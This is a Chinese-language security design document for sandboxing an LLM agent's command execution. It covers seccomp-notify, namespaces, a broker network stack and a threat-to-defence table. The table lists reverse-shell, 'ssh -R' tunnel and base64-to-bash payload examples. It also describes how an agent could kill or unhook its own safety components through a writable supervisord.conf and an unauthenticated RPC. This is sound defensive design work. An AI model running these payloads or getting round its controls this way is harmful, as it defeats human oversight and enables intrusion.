# 云侧沙箱安全管控方案（完整版）

> 版本：v1.0　日期：2026-11-23
> 定位：自包含的完整方案文档，整合《设计文档》v1.2、《实施清单》v1.3 实测结论与《平台需求单》。阅读顺序：总体架构（含一次命令执行的完整生命周期）→ 各板块作用与实现逻辑 → 板块×需求对应 → 攻击风险×板块能力。
> 环境前提（实测终态）：华为云 CCE K8s Pod，内核 5.10 aarch64；**全程无 root、容器定义不可改**；OpenClaw 6.6（xy_channel 插件体系）；supervisord 管理常驻进程。

---

## 1. 总体架构

### 1.1 架构取舍：为什么是"插件层 + Exec Broker v2"

环境有两个硬约束：**任何路径拿不到 root**（容器登录即 sandbox，uid 1001）且**容器启动配置不可改**。传统"root Daemon + iptables/fanotify/AppArmor"路线全部不可用。但实测（清单 T1–T10b）证明无 root 下仍有三样内核级武器：

| 武器 | 依据 | 得到的隔离 |
|------|------|-----------|
| unprivileged user namespace + mount/net namespace | T1/T2 实测 | 每次 exec 独立构造"无网 + 敏感路径遮蔽 + 仅工作目录可写"的进程级沙箱 |
| no_new_privs + seccomp user notification | T5/T9 实测 | 无 root 拦截子进程 `execve`，同步裁决（脚本体内派生进程可见） |
| OpenClaw 插件钩子（before_tool_call / resolve_exec_env / before_install） | SDK 验证 | 工具调用前的同步裁决点与 exec 环境注入点，无需改 OpenClaw 本体 |

架构因此定型为**三层防御 + 云侧权威 + 自愈兜底**：

### 1.2 架构图

```
┌─────────────────────────── 云侧控制面 ───────────────────────────┐
│ 策略中心(名单/版本/签名)  审批服务  scope服务  OBS  失管告警      │
└───────▲───────────────────▲───────────────────▲──────────────────┘
        │签名策略pull/心跳    │审批回执/事件上报   │制品上传/云扫回写
┌───────┴───────────────────┴───────────────────┴──────────────────┐
│ 沙箱容器（全部进程 uid 1001，无 root）                            │
│                                                                  │
│ ┌─ OpenClaw gateway（supervisord 管理） ──────────────────────┐  │
│ │ 【板块①：插件层】（gateway 进程内，xy_channel 插件）         │  │
│ │ 本地策略引擎（三名单/tokenize/解码）│ 脚本扫描 │ 事件总线    │  │
│ │ before_tool_call → block / requireApproval                  │  │
│ │ resolve_exec_env → 注入管控环境变量                          │  │
│ │ scope 代发云侧调用 │ OBS 客户端（哈希去重上传）              │  │
│ └──────┬────────────────────────────────────▲────────────────┘  │
│        │exec 工具调用                         │裁决结果/注入env   │
│ ┌──────▼───────────────┐                      │                  │
│ │【板块②：safe-launcher】│──Unix socket───────┼───┐              │
│ │ 每次 exec 的包装器    │  取策略/传递notify fd│   │              │
│ └──────┬───────────────┘                      │   │              │
│        │fork+unshare+mount+seccomp            │   │              │
│ ┌──────▼─────────────────────────────────┐   │   │              │
│ │【板块③：exec 沙箱】（子进程运行态）     │   │   │              │
│ │ netns 零外网 │ mountns 遮蔽/只读挂载    │   │   │              │
│ │ tmpfs noexec │ 仅 workdir 可写          │   │   │              │
│ │ 解释器钩子（Python audit/Node 权限）    │   │   │              │
│ │ seccomp filter：execve→通知板块④ ───────┼───┼───┘              │
│ │ 网络：唯一出口经板块④用户态网络栈 ──────┼───┘                  │
│ └─────────────────────────────────────────┘   │                  │
│ ┌─【板块④：safe-broker】（supervisor 常驻，Go/arm64 静态）─────┐ │
│ │ 用户态网络栈（出站唯一通道+策略+审计）│ seccomp-notify 裁决  │ │
│ │ /proc 检测器（反连 shell）│ 策略缓存验签 │ 心跳 │ 事件聚合   │ │
│ └──────────────────────────────────────────────────────────────┘ │
│ 【板块⑤：supervisord + 平台自愈链】autorestart 拉起；平台兜底重启 │
└──────────────────────────────────────────────────────────────────┘
```

### 1.3 一次命令执行的完整生命周期（核心实现逻辑）

以"LLM 决定执行 `python3 x.py`"为例，**每一跳都是同步裁决点**：

1. **L-A 工具调用裁决（板块①）**：OpenClaw 触发 `before_tool_call` → 插件层对命令串做 tokenize（递归 base64/hex 解码、软链展开、cd 链跟踪）→ 匹配本地三名单：
   - 黑 → 返回 `{block, blockReason}`，执行终止，产生审计事件；
   - 灰 → 返回 **`requireApproval`**（含 `timeoutBehavior:"deny"`）→ OpenClaw 原生审批链弹出确认（channel 已有中文文案层），用户确认/拒绝/超时默认拒；
   - 脚本类调用（`python3 x.py`、`bash x.sh`）→ 读脚本内容过本地规则（`socket+dup2+pty` 组合直接黑），同时**上传 OBS 云扫**（§2.1.6）；
   - 白/默认 → 放行进入下一步。
2. **L-B spawn 包装（板块①→②）**：OpenClaw 触发 `resolve_exec_env` → 插件层返回注入 env（`PYTHONPATH`/`NODE_OPTIONS`/`LD_PRELOAD`/代理变量）→ exec 经 **safe-launcher** 启动。
3. **构造沙箱（板块②）**：launcher 向 safe-broker 取当前策略版本 → `unshare` 建 userns+mountns+netns → 按策略做挂载（敏感路径遮蔽、`/etc` 等 bind-ro、`/tmp` tmpfs noexec、仅 workdir 可写）→ 置 `no_new_privs` → 装 **seccomp filter**（`execve/execveat` → 通知 Broker，其余放行）→ 拿到 notify fd 注册到 Broker → `exec` 目标命令。
4. **沙箱内运行（板块③）**：子进程**默认零外网**（netns 内只有 loopback，唯一数据通道是 launcher 传入的、连接 Broker 的 fd）；解释器钩子生效（Python audit hook 拦 `os.system`/`subprocess`/socket；Node `--permission` 拒 `child_process`）；文件访问受挂载策略约束。
5. **L-C 运行时裁决（板块④）**：脚本体内再派生任何进程（任何语言、含静态/Go 二进制）→ 命中 seccomp filter → **系统调用挂起**，Broker 收到通知 → 用与 L-A 同一套名单同步裁决 → 放行（CONTINUE）或拒绝（errno 返回 + 事件）。灰名单在此层无法挂起等待人工 → 同步拒并提示改走工具调用层。
6. **网络出站（板块④）**：子进程的网络包经 Broker **用户态网络栈**转发——Broker 在转发点执行出站策略（域名/IP/端口白名单、协议限 HTTP/HTTPS、大小/超时/会话时长、beacon 检测、DNS 代理解析），不合规直接断流并产生事件。
7. **运行时检测（板块④）**：Broker 周期扫 `/proc`（fd 0/1/2 是 socket、pty 分配、异常父子关系）→ 命中反连特征 → **SIGSTOP 冻结 → 采集取证（cmdline/五元组/父链）→ SIGKILL → 事件上报**。
8. **审计闭环（板块①④→云侧）**：上述每一层的事件进事件总线 → 聚合上云 + 推 HIPS；制品（脚本/安装包）哈希存证 OBS。

### 1.4 分层防御概览

| 层 | 拦截什么 | 机制 | 硬度 |
|----|----------|------|------|
| L-A 工具调用裁决 | LLM 发起的 exec/bash 命令 | OpenClaw `before_tool_call` 同步 block / requireApproval | 中（进程内，名单可被混淆绕过→由 L-C 兜底） |
| L-B spawn 包装 | 解释器/动态库层行为 | `resolve_exec_env` 注入 Python audit hook、Node permission、LD_PRELOAD shim | 中（减速带，`-S`/原生扩展/静态二进制可绕→由 L-C 兜底） |
| L-C 系统调用裁决 | 脚本体内进程派生（任何语言） | seccomp user-notify 拦 `execve`，Broker 同步裁决 | **硬**（syscall 级，filter 跨 exec/fork 继承、目标不可移除） |
| 网络隔离 | 一切直连外网/横向 | netns 零外网 + Broker 用户态网络栈唯一出口 | **硬**（内核命名空间） |
| 文件隔离 | 读凭证/策略、写工作目录外 | mountns 遮蔽/bind-ro、tmpfs noexec | **硬** |
| 云侧权威 | 策略伪造、凭证滥用 | 签名验签（fail-close）、短期 scope token、OBS 存证 | 硬（密码学） |
| 自愈兜底 | 杀 Broker/摘除安全组件 | supervisor autorestart + 心跳失管告警 + 平台 self_heal | 软（可观测可恢复，非不可穿透——§2.5 如实披露） |

> 硬度图例：**硬**＝内核命名空间/系统调用/密码学保证，与进程行为无关；**中**＝进程内或解释器层，存在绕过面但低成本且有兜底；**软**＝同 uid 下无法阻止、靠恢复+可观测补偿。

---

## 2. 板块详述（作用 + 实现逻辑）

### 2.1 板块①：插件层（xy_channel 插件，gateway 进程内）

**作用**：策略裁决的"大脑前门"——所有 LLM 工具调用的同步裁决点；事件总线、scope 代发、OBS 客户端的载体。

**实现逻辑**：

1. **本地策略引擎**：策略（§3 Schema）从云侧签名拉取、验签、热更新、本地缓存。匹配前先做**命令规范化**：按 shell 语法 tokenize（不是空格 split——修复 CSPL 现状缺口）、递归解码 base64/hex、展开软链真实路径、跟踪 `cd` 链把相对路径绝对化。
2. **三名单裁决**：命中黑名单 → `{block:true, blockReason:"<结构化错误码>"}`；命中灰名单 → `{requireApproval:{title, description, severity, timeoutMs, timeoutBehavior:"deny", allowedDecisions, onResolution}}`（OpenClaw 6.6 SDK 原生能力，**审批超时默认拒绝**）；白名单直接放行；默认策略 default-allow 常规开发命令、高危类目必拦（拍板决策 1）。
3. **脚本内容感知**：`python3 x.py`/`bash x.sh`/`-c` 内联/管道执行 → 读取脚本体过本地规则集（分语言危险 API 规则：`socket+dup2+pty.spawn` 组合、`/dev/tcp`、反向隧道参数等，组合命中直接黑）→ 可疑转灰名单审批；扫描不出的混淆样本由 OBS 云扫兜底（见 2.1.6）。
4. **环境注入（L-B）**：实现 `resolve_exec_env` 钩子（exec 工具专属），返回注入 env——`PYTHONPATH`（指向含 audit hook 的 sitecustomize 目录）、`NODE_OPTIONS="--permission --allow-fs-read=<workdir> --allow-fs-write=<workdir>"`（T10b 已验证可注入，默认拒 child_process/worker）、`LD_PRELOAD`（execve-shim，动态二进制派生转发 Broker）、`HTTP(S)_PROXY`（减速带）。
5. **事件总线**：统一接收 L-A 裁决、L-B 钩子、L-C 拦截、Broker 网络与检测器事件 → 缓冲批量上云 + 推 HIPS（需求 6 的接口载体）。
6. **OBS 客户端**：复用 CSPL 已有链路（`upload_file.ts`）：内容哈希 → 去重命中跳过 → 申请签名 URL → 上传 → 云扫判定回写本地名单（按哈希缓存 allow/grey/deny）。
7. **scope 代发**：Agent 不直接持有云侧凭证，云侧 API 调用由插件层代发并附加 scope token；本地凭证（`.xiaoyienv`）仅作短期缓存，长期改云侧短期 token（需求 7，§2.6.3）。
8. **安装拦截**：`before_install` 钩子（已有实现：hash+zip 上传+云扫阻断）覆盖 skill/plugin/专家团安装。

### 2.2 板块②：safe-launcher（exec 包装器）

**作用**：把"容器不可配"失去的最小权限，在**每次 exec 时逐次构造**回来——这是整个方案硬边界的制造点。

**实现逻辑**（启动序列，全部无 root 可行）：

1. 被调用时先经 Unix socket 向 safe-broker 请求当前策略版本与沙箱参数（拿不到 Broker 响应 → fail-close 拒绝执行并告警）。
2. `unshare(CLONE_NEWUSER|CLONE_NEWNS|CLONE_NEWNET)` 一次调用建好三个命名空间（T1 实测）；
3. **挂载策略**：`/etc`、`/opt` 等 bind-ro；`.xiaoyienv`、策略目录、其他会话数据用空文件/空目录 bind 遮蔽；`/tmp` 重新挂 tmpfs（`noexec,nosuid,nodev`）；workdir bind 为可写（`nosuid,nodev`）；`/proc` 重新挂载（沙箱视角）；
4. **降权与过滤**：`prctl(PR_SET_NO_NEW_PRIVS,1)`（T5 实测）→ `seccomp(NEW_LISTENER)` 装 filter：`execve/execveat` 转 `SECOMP_RET_USER_NOTIF` 并取回 notify fd，禁 `ptrace/mount/reboot` 等，其余 ALLOW；notify fd 连同子进程身份信息注册给 safe-broker；
5. **网络接线**：netns 内只有 loopback；launcher 与 Broker 间建一对 fd（slirp 式），Broker 侧为用户态网络栈提供出口；
6. `exec` 目标命令，env 为板块①注入的管控环境。filter 跨 exec/fork 继承，目标进程无法移除（nnp）。

### 2.3 板块③：exec 沙箱（子进程运行态隔离）

**作用**：业务命令真正运行的"笼子"——出网、文件、提权、派生四个维度的硬约束。

**实现逻辑**：

- **出网**：netns 无外部接口，任何 `connect()` 没有路由；唯一数据通路是到 Broker 网络栈的 fd → "默认零外网，显式才放行"。
- **文件**：看不到被遮蔽路径（凭证/策略/其他会话）、系统目录只读、只有 workdir 可写、`/tmp` 落地不可执行。
- **提权**：nnp 阻断 setuid/file-cap 提权；seccomp 禁 ptrace（无法调试其他进程）、禁 mount（无法改自己的笼子）。
- **解释器收敛**：Python audit hook（PEP 578，Python 3.12）拦截 `os.system`/`subprocess.Popen`/`socket.connect`/灰名单路径 `open` → 抛异常 + 事件；Node `--permission`（v24）默认拒 `child_process`/`worker_threads`、fs 限 workdir。两者是减速带（`-S`/原生扩展可绕），由 L-C 兜底。
- **派生裁决**：任何语言派生新进程都触发 seccomp 通知 → Broker 同步裁决（§1.3 第 5 步）。

### 2.4 板块④：safe-broker（supervisor 常驻 Go 程序，arm64 静态编译）

**作用**：沙箱内唯一的"特权服务"（仅指职能集中，权限仍是 sandbox）——出站唯一通道、系统调用裁决器、运行时检测器、策略权威缓存、心跳源。

**实现逻辑**（五个子系统）：

1. **用户态网络栈（出站管控，需求 5a 主管道）**：基于 gVisor netstack 类纯 Go TCP/IP 栈，终结各 exec 沙箱来的流量，按策略转发：域名/IP 黑白名单、CONNECT 限 443、协议仅 HTTP/HTTPS、请求体大小/连接超时/单连接字节上限、beacon 节律检测（固定间隔小包→告警断连）、DNS 代理解析（限速/记录类型限制/高熵子域检测，防 DNS 隧道）、**TLS 拦截[拍板项]**（流量汇聚点天然在位；私有 CA 依赖平台需求单 A3③）。
2. **seccomp-notify 裁决器（L-C）**：epoll 监听所有 launcher 注册的 notify fd → 收到 `execve` 通知（含 pid、argv 指针——经 `/proc/<pid>/mem` 按 notify 给的地址读取参数）→ 同一套三名单同步裁决 → 回 `SECCOMP_USER_NOTIF_FLAG_CONTINUE` 放行或 `errno=EACCES` 拒绝 + 事件。notify fd 双份托管（launcher+broker），Broker 死亡时被挂起调用返 ENOSYS（fail-closed，方向正确）。
3. **/proc 检测器（反连 shell，L3）**：周期扫 `/proc/*/fd`——fd 0/1/2 为 socket 的进程、非 Broker 派生的 pty 分配、shell 父进程是 python/node 等非终端进程 → 命中即 **SIGSTOP 冻结进程树 → 采集 `/proc/<pid>/cmdline`、连接五元组、父链 → SIGKILL → 事件上报 + 快照传 OBS**（freezer 已实测不可用，T3，处置改用信号）。
4. **策略缓存与验签**：拉取云侧签名策略、校验签名与版本、热更新、落盘缓存（sandbox 拥有）。**缓存与 Agent 同主可改 → 加载必验签，失败即 fail-close 拒绝服务并上报**——篡改只能造成可用性破坏，伪造不了授权。
5. **心跳与失管告警**：周期向云侧心跳（含自检结果：notify fd 数、supervisor RPC 可达性、策略版本）；心跳缺失 → 云侧告警 → 平台自愈链介入（§2.5）。

### 2.5 板块⑤：supervisord + 平台自愈链

**作用**：安全组件的"生命维持"——常驻拉起、死亡恢复；平台侧是最后的兜底。

**实现逻辑**：

- safe-broker 注册为 supervisor program（模板已验证：`[program:safe-broker] autorestart=true killasgroup=true stopsignal=TERM`），被杀秒级拉起；
- supervisord 本身由平台侧 `/opt/bin/self_heal.py`（非 sandbox 可写）看护——supervisord 死亡触发容器/服务器级重启（平台机制，需求单 C4 确认其行为细节）；
- **如实披露（软锚点）**：`supervisord.conf` 与 Agent 同主可写、XML-RPC（127.0.0.1:9001）无认证——Agent 可改配置摘除安全组件或经 RPC 停程序。补偿：Broker 周期自检 RPC/配置完整性 + 心跳缺失告警 + 平台需求单 A4/A5（RPC 加认证、配置哈希基线）。**本方案承诺"失管可观测、状态可恢复"，不承诺组件不可穿透。**

### 2.6 板块⑥：云侧控制面

**作用**：一切安全语义的**唯一权威源**——策略、审批、授权、存证、失管监测。

**实现逻辑**：

1. **策略中心**：名单/阈值/网络策略的 CRUD、版本号、签名（私钥不出控制面）、推送通道（Broker 长连接 pull 为主，离线时本地缓存顶用）、按灰度批次下发（审计模式→逐类目 enforce）。
2. **审批服务**：接收插件层 `requireApproval` 转化的人工确认请求（经 OpenClaw 原生审批链/channel 文案层）→ 回执决策；**超时行为固定默认拒绝**；维护授权累积 ledger（每次"总是允许"转化为带有效期/次数的 scope 授权项）。
3. **scope 服务**：签发短期 scope token（对接 PICOD 鉴权模型）；云侧各服务在接入点校验 scope，超范围调用拒绝并记录；token 可吊销。
4. **OBS**：bucket 规划、签名 URL 签发、制品生命周期管理；云扫服务（YARA/静态/语义分析）对上传制品重扫，判定回写沙箱本地名单。
5. **失管告警**：监测各沙箱 Broker 心跳，缺失/异常 → 告警 + 触达平台自愈链；心跳内容含策略版本，可发现"策略被回滚/组件被摘除"。

---

## 3. 板块 × 需求清单对应关系

| # | 需求 | 主责板块 | 协同板块 | 实现要点（对应章节） |
|---|------|----------|----------|----------------------|
| 1 | 默认权限范围 | ② safe-launcher | ③ exec 沙箱、⑥ 云侧 | 容器层平台固化；权限收敛在 launch 时逐次构造：无网 netns、ro/遮蔽挂载、tmpfs noexec、nnp+seccomp（§2.2/2.3）；逻辑范围由云侧 scope JSON 下发（§2.6.3） |
| 2 | 文件安全（灰/白名单） | ②③ | ①⑥ | 白名单=挂载层"非白即拒"（workdir 可写、其余 ro/遮蔽）；灰名单=①解析命令路径→`requireApproval` + 解释器钩子拦灰路径 open；黑名单=挂载遮蔽直接不可达（§2.2/2.3/4.2*） |
| 3 | 命令安全（黑/白/灰名单） | ① 插件层 | ④ Broker、⑥ 云侧 | L-A 三名单+requireApproval（§2.1.2）；脚本内容扫描+OBS 云扫（§2.1.3/2.1.6）；**脚本体内派生由 L-C 兜底**（§2.4.2） |
| 4 | 批量删除审批 | ① 插件层 | ③⑥ | `rm -r`/通配/多目标超阈值→`requireApproval`；实际执行改 `mv` 到 workdir 隔离区，确认后真删、误删可恢复；脚本体内删除→脚本整体灰名单+OBS 审计（§2.1.2/2.1.3） |
| 5 | 安全网关（出/入站） | ④ safe-broker | ②③、平台、⑥ | 出站：netns 零外网 + Broker 用户态网络栈策略链（域名/端口/协议/大小/超时/beacon/DNS/TLS 拦截[拍板]）（§2.4.1）；入站：平台零暴露 + loopback 自律 + 云侧 gateway 反代显式开通（§4.5*） |
| 6 | HIPS 入侵检测 | ① 事件总线 | ④⑥ | 统一事件源（L-A/L-B/L-C/网络/检测器）→ JSON 事件流推 HIPS；HIPS 判定回写→Broker 执行阻断；Schema 与冯经理对齐（§2.1.5/2.4.5） |
| 7 | 用户授权范围 | ⑥ scope 服务 | ①④ | Agent 不持凭证：插件层代发+scope token；默认授权+审批累积授权（ledger）；凭证现实模型：短期 token+挂载遮蔽+泄露限额审计（§2.1.7/2.6.3） |
| 8 | 制品上传 OBS | ① OBS 客户端 | ⑥ | exec 脚本/安装包/灰名单文件→哈希去重→签名 URL→上传→云扫回写本地名单；`before_install` 已有实现复用（§2.1.6/2.1.8/2.6.4） |

\* 标注为《设计文档》v1.2 章节号。

---

## 4. 攻击风险 × 板块能力对应关系

| 攻击场景 | 典型载荷 | 拦截板块 | 拦截点与逻辑 | 硬度 | 残余风险 |
|----------|----------|----------|--------------|------|----------|
| 直接反连 shell | `bash -i >& /dev/tcp/IP/4444`、`nc -e`、python socket+dup2 | ③④ ① | netns 零外网 → connect 无处可去（硬）；`/dev/tcp`、`nc -e` 特征串命中黑名单（①）；execve 派生经 L-C 裁决（④） | 硬 | 无（多道独立拦截） |
| 隧道化反连（主战场） | chisel/frp、WebSocket shell、HTTP 轮询 C2 | ④ ⑥ | 唯一通道在 Broker 网络栈：CONNECT 限 443、WS 灰名单、新域名灰名单、beacon 节律/长会话/字节上限检测、可选 TLS 拦截 | 中-硬 | 放行域名上的 C2（CDN 域前置）→ 行为检测+审计接受（R7） |
| DNS 隧道 | iodine/dnscat2 | ④ | DNS 由 Broker 代理解析：限速、限制 TXT/NULL、高熵子域检测 | 硬 | 低速隧道 → 行为基线告警 |
| 编码/混淆绕过 | `echo <b64> \| base64 -d \| bash`、软链改名 | ① ④ | L-A 递归解码 + 软链展开后再匹配名单；解码不出的由 L-C execve 裁决兜底（编码在 exec 时必然现形） | 硬 | 无（execve 层与字符串无关） |
| 脚本体内攻击 | `python3 evil.py` 内 `os.system("rm -rf")`/`subprocess` 反连 | ①③ ④ | 脚本内容扫描+OBS 云扫（①）；Python audit hook/Node permission 解释器层拦截（③，减速带）；**L-C execve 同步裁决（④，任何语言含静态/Go 二进制）** | 硬（L-C） | 解释器钩子的 `-S`/原生扩展绕过 → L-C 已兜住 |
| 安装时执行 | `pip install <恶意 setup.py>`、npm postinstall、`yum install nmap-ncat` | ① ④ | 安装类命令默认灰名单→人工审批（①）；制品上传 OBS 云扫回写；安装后产生的二进制再执行仍过 L-C | 中-硬 | 审批疲劳 → 灰名单按类目灰度收紧 |
| 批量删除 | `rm -rf` 工作目录、脚本循环删除 | ① ③ | 超阈值→审批；删除改隔离区可恢复；脚本体内删除→脚本整体灰名单+audit hook 事件 | 中 | 阈值下零散删除 → 隔离区+审计接受 |
| 数据外发 | 大文件经代理外发 | ④ ⑥ | Broker 单连接字节上限/请求体大小限制；外发目标限白名单域；流量全审计 | 硬 | 白名单域内低速外发 → scope 限额+审计 |
| 横向移动 | 访问云元数据、内网服务、K8s API | 平台 ④ | 元数据平台已封（保持项 A2）；Broker deny RFC1918（DNS/云侧例外）；SA token 未挂载、API 不可达（实测） | 硬 | 新增内网服务面 → D2 探测+策略迭代 |
| SSH 反向隧道 | `ssh -R 8080:… attacker` | ①④ 平台 | 镜像裁剪 ssh client（需求单 A3①）；`ssh -R` 特征黑名单；Broker 仅放 HTTP/HTTPS | 中-硬 | yum 装回 openssh → 协议层已掐死，仅减速带缺口 |
| 提权 | setuid 滥用、内核 exp、ptrace | ③ | nnp 禁提权原语；seccomp 禁 ptrace/mount；userns 内无额外权限；无 root 可提（全体 uid 1001） | 硬 | 内核 0day/Nday → 平台补丁基线（R5） |
| **杀安全组件** | kill safe-broker、kill supervisor | ⑤ ⑥ | **无法阻止（同 uid）** → supervisor autorestart 秒级拉起；心跳缺失云侧告警；kill 行为产生事件 | **软** | 失管窗口秒~分钟级，可观测可恢复（R1） |
| **摘除安全组件** | 改 `supervisord.conf`、调无认证 RPC（127.0.0.1:9001）停程序 | ⑤ ⑥ 平台 | Broker 周期自检 RPC/配置完整性；心跳缺失告警；平台 self_heal 重启兜底；需求单 A4/A5 求 RPC 认证+配置基线 | **软** | 失管直至平台介入，云侧可见（R2） |
| 篡改本地策略/插件代码 | 改写策略缓存、改插件 js | ④⑥ | 加载必验签，失败 fail-close 拒绝服务并告警；插件代码哈希上云巡检 | 中 | 只能破坏可用性，伪造不了授权（R3） |
| 窃取云凭证 | 读 `.xiaoyienv`（PERSONAL-API-KEY） | ②③ ⑥ | launch 沙箱内遮蔽该文件（exec 子进程不可达）；云侧改短期 scope token + 吊销 + 调用审计 | 中 | gateway 进程面同 uid 可读 → scope 限额接受（R4） |
| 持久化 | 写自启脚本、落地二进制 | ③ 平台 | 仅 workdir 可写、`/tmp` noexec；平台重启镜像还原即清；落地二进制执行过 L-C | 硬 | workdir 内残留文件 → 重启清理+审计 |
| 端口暴露 | 启动 web 服务对外 | 平台 ④ | 平台零暴露（需求单 B4）；非 loopback listen 被 /proc 检测发现 | 硬 | 无（listen 也过不了网络栈策略） |
| 反安全探测 | 读 Broker 内存/策略（同 uid ptrace/读 /proc/mem） | ③ ④ | exec 沙箱内 seccomp 禁 ptrace；策略在沙箱内不可见（遮蔽）；Broker 内存同 uid 技术上可读——**接受**：策略非密（名单可推知），密钥不出云侧 | 软 | 接受（R3/R4 同源），敏感的是私钥而非名单 |

**一句话总结**：网络、文件、提权、脚本体内派生四类硬边界由"launch 时沙箱 + seccomp-notify + 用户态网络栈"在内核层保证；策略与授权的真实性由云侧密码学保证；同 uid 带来的"组件可被杀/被摘除"以自愈+心跳+审计补偿并如实披露——整体满足需求 1–8，且不依赖任何容器配置变更或 root 权限。
